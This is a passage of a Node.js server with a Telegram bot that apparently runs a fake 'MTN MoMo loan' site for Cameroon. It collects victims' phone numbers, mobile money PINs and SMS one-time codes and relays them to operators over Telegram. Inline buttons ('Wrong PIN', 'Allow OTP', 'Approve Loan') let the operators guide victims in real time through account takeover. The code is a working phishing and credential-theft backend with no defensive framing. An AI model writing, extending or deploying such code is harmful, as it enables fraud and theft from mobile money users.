                    [{ text: '✅ Correct - Allow OTP', callback_data: `allow_pin_${assignedAdmin.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({
            success: true,
            applicationId,
            assignedTo: assignedAdmin.name,
            assignedAdminId: assignedAdmin.adminId
        });

    } catch (error) {
        console.error('❌ Error in verification endpoint:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    } finally {
        if (lockKey) processingLocks.delete(lockKey);
    }
});

// GET /api/check-pin-status/:applicationId OR /api/check-sms-status/:applicationId
app.get(['/api/check-pin-status/:applicationId', '/api/check-sms-status/:applicationId'], async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({
                success: true,
                status: application.pinStatus,
                pinStatus: application.pinStatus,
                otpStatus: application.otpStatus
            });
        } else {
            res.status(404).json({ success: false, message: 'Application session not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error while checking status.' });
    }
});

// POST /api/verify-otp OR /api/submit-otp
app.post(['/api/verify-otp', '/api/submit-otp'], async (req, res) => {
    try {
        const applicationId = req.body.applicationId || req.body.appId;
        const otp           = req.body.otp || req.body.code || req.body.sms;

        if (!applicationId || !otp) {
            return res.status(400).json({ success: false, message: 'Application ID and OTP code are required.' });
        }

        const application = await db.getApplication(applicationId);
        if (!application) {
            return res.status(404).json({ success: false, message: 'Application session expired or not found.' });
        }

        if (!adminChatIds.has(application.adminId)) {
            const admin = await db.getAdmin(application.adminId);
            if (admin?.chatId) {
                adminChatIds.set(application.adminId, admin.chatId);
            } else {
                return res.status(500).json({ success: false, message: 'Assigned admin is currently unreachable.' });
            }
        }

        await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `
🔢 *OTP VERIFICATION CODE SUBMITTED*

📋 App ID: \`${applicationId}\`
📞 Phone: \`+237 ${formatPhone(application.phoneNumber)}\`
🔐 Code: \`${otp}\`
⏰ Time: ${new Date().toLocaleString()}

⚠️ *ACTION REQUIRED:*
        `, {
            parse_mode: 'Markdown',
            reply_markup: {
                inline_keyboard: [
                    [{ text: '❌ Wrong PIN',   callback_data: `wrongpin_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '❌ Wrong Code',  callback_data: `wrongcode_otp_${application.adminId}_${applicationId}` }],
                    [{ text: '✅ Approve Loan', callback_data: `approve_otp_${application.adminId}_${applicationId}` }]
                ]
            }
        });

        res.json({ success: true, message: 'OTP submitted successfully.' });
    } catch (error) {
        console.error('❌ Error in /api/verify-otp:', error);
        res.status(500).json({ success: false, message: 'Server error: ' + error.message });
    }
});

// GET /api/check-otp-status/:applicationId
app.get('/api/check-otp-status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({
                success: true,
                status: application.otpStatus,
                pinStatus: application.pinStatus,
                otpStatus: application.otpStatus
            });
        } else {
            res.status(404).json({ success: false, message: 'Application session not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error.' });
    }
});

// GET /api/status/:applicationId
app.get('/api/status/:applicationId', async (req, res) => {
    try {
        const application = await db.getApplication(req.params.applicationId);
        if (application) {
            res.json({
                success: true,
                pinStatus: application.pinStatus,
                otpStatus: application.otpStatus,
                application
            });
        } else {
            res.status(404).json({ success: false, message: 'Application session not found.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error.' });
    }
});

// POST /api/resend-otp
app.post('/api/resend-otp', async (req, res) => {
    try {
        const applicationId = req.body.applicationId || req.body.appId;
        const application   = await db.getApplication(applicationId);
        
        if (!application) return res.status(404).json({ success: false, message: 'Application session not found.' });

        await db.updateApplication(applicationId, { otpStatus: 'pending' });

        await sendToAdmin(application.adminId, `
🔄 *OTP RESEND REQUESTED*

📋 App ID: \`${applicationId}\`
📞 Phone: \`+237 ${formatPhone(application.phoneNumber)}\`
⏰ Time: ${new Date().toLocaleString()}
        `, { parse_mode: 'Markdown' });

        res.json({ success: true, message: 'Resend request sent to operator.' });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error.' });
    }
});

// GET /api/admins
app.get('/api/admins', async (req, res) => {
    try {
        const admins = await db.getActiveAdmins();
        const adminList = admins
            .filter(a => !pausedAdmins.has(a.adminId))
            .map(a => ({ id: a.adminId, name: a.name, status: a.status, connected: adminChatIds.has(a.adminId) }));
        res.json({ success: true, admins: adminList });
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error fetching admins.' });
    }
});

// GET /api/validate-admin/:adminId
app.get('/api/validate-admin/:adminId', async (req, res) => {
    try {
        const admin = await db.getAdmin(req.params.adminId);
        if (admin && pausedAdmins.has(admin.adminId)) {
            return res.json({ success: true, valid: false, message: 'Admin access is currently paused.' });
        }
        if (admin && admin.status === 'active') {
            res.json({
                success: true,
                valid: true,
                connected: adminChatIds.has(admin.adminId),
                admin: { id: admin.adminId, name: admin.name }
            });
        } else {
            res.json({ success: true, valid: false, message: 'Admin link not found or inactive.' });
        }
    } catch (error) {
        res.status(500).json({ success: false, message: 'Server error.' });
    }
});

// GET /health
app.get('/health', (req, res) => {
    res.json({
        status:       'ok',
        region:       'Cameroon (+237)',
        database:     dbReady ? 'connected' : 'not ready',
        activeAdmins: adminChatIds.size,
        pausedAdmins: pausedAdmins.size,
        botMode:      'webhook',
        webhookUrl:   `${WEBHOOK_URL}${webhookPath}`,
        timestamp:    new Date().toISOString()
    });
});

// Serve Front-End Landing Page
app.get('/', async (req, res) => {
    const adminId = req.query.admin;

    if (adminId) {
        try {
            const admin = await db.getAdmin(adminId);
            if (admin && admin.status === 'active' && !pausedAdmins.has(adminId)) {
                if (admin.chatId && !adminChatIds.has(adminId)) {
                    adminChatIds.set(adminId, admin.chatId);
                }
            }
        } catch (error) {
            console.error('Error validating admin on landing page query:', error);
        }
    }

    const htmlPath = path.join(__dirname, 'mtn-cameroon-integrated.html');
    if (fs.existsSync(htmlPath)) {
        res.sendFile(htmlPath);
    } else {
        res.sendFile(path.join(__dirname, 'index.html'));
    }
});

// ==========================================
// SYSTEM INITIALIZATION & SERVER STARTUP
// ==========================================
console.log('⏳ Setting up bot handlers...');
bot.on('error',         (error) => console.error('❌ Telegram Bot error:', error?.message));
bot.on('polling_error', (error) => console.error('❌ Polling error:', error?.message));
setupCommandHandlers();

db.connectDatabase()
    .then(async () => {
        dbReady = true;
        console.log('✅ Database connected!');

        await loadAdminChatIds();

        const fullWebhookUrl = `${WEBHOOK_URL}${webhookPath}`;
        let webhookSetSuccessfully = false;
        let attempts = 0;

        while (!webhookSetSuccessfully && attempts < 3) {
            attempts++;
            try {
                console.log(`🔄 Webhook configuration attempt ${attempts}/3: ${fullWebhookUrl}`);
                await bot.deleteWebHook();
                await new Promise(resolve => setTimeout(resolve, 1000));

                const result = await bot.setWebHook(fullWebhookUrl, {
                    drop_pending_updates: false,
                    max_connections: 40,
                    allowed_updates: ['message', 'callback_query']
                });

                if (result) {
                    const info = await bot.getWebHookInfo();
                    if (info.url === fullWebhookUrl) {
                        webhookSetSuccessfully = true;
                        console.log(`✅ Webhook verified: ${fullWebhookUrl}`);
                    }
                }
            } catch (webhookError) {
                console.error(`❌ Webhook attempt ${attempts} failed:`, webhookError.message);
                if (attempts < 3) await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!webhookSetSuccessfully) {
            console.error('❌ CRITICAL: Could not confirm Webhook configuration with Telegram.');
        }

        try {
            const botInfo = await bot.getMe();
            console.log(`🤖 Bot online: @${botInfo.username} (${botInfo.first_name})`);
        } catch (botError) {
            console.error('❌ Bot API identity error:', botError.message);
        }

        // Webhook health check loop (every 60s)
        setInterval(async () => {
            try {
                const info  = await bot.getWebHookInfo();
                const isSet = info.url === fullWebhookUrl;
                if (!isSet) {
                    console.log('⚠️ Restoring Webhook configuration...');
                    await bot.setWebHook(fullWebhookUrl, {
                        drop_pending_updates: false,
                        max_connections: 40,
                        allowed_updates: ['message', 'callback_query']
                    });
                }
            } catch (error) {
                console.error('⚠️ Webhook monitor check error:', error.message);
            }
        }, 60000);

        // Keep-alive internal ping
        setInterval(() => {
            const pingUrl = `${WEBHOOK_URL}/health`;
            if (typeof fetch === 'function') {
                fetch(pingUrl).catch(() => {});
            }
        }, 14 * 60 * 1000);

        // Start Express Listening
        app.listen(PORT, () => {
            console.log(`\n💛 MTN MOMO LOAN PLATFORM (CAMEROON)`);
            console.log(`===================================`);
            console.log(`🌐 Server running on: http://localhost:${PORT}`);
            console.log(`🤖 Telegram Webhook URL: ${fullWebhookUrl}`);
            console.log(`👥 Admins active: ${adminChatIds.size}`);
            console.log(`\n✅ Platform operational!\n`);
        });

    })
    .catch((error) => {
        console.error('❌ Database connection failed during startup:', error);
        process.exit(1);
    });

// ==========================================
// GRACEFUL SHUTDOWN HANDLERS
// ==========================================
async function shutdownGracefully(signal) {
    console.log(`\n🛑 Received ${signal}. Shutting down server gracefully...`);
    try {
        suspendAllSessions.clear();
        await bot.deleteWebHook();
        await db.closeDatabase();
        console.log('✅ Server and connections closed cleanly.');
        process.exit(0);
    } catch (error) {
        console.error('❌ Shutdown error:', error);
        process.exit(1);
    }
}

process.on('SIGTERM', () => shutdownGracefully('SIGTERM'));
process.on('SIGINT',  () => shutdownGracefully('SIGINT'));

process.on('unhandledRejection', (reason) => {
    console.error('❌ Unhandled Rejection:', reason);
});

process.on('uncaughtException', (error) => {
    console.error('❌ Uncaught Exception:', error);
});
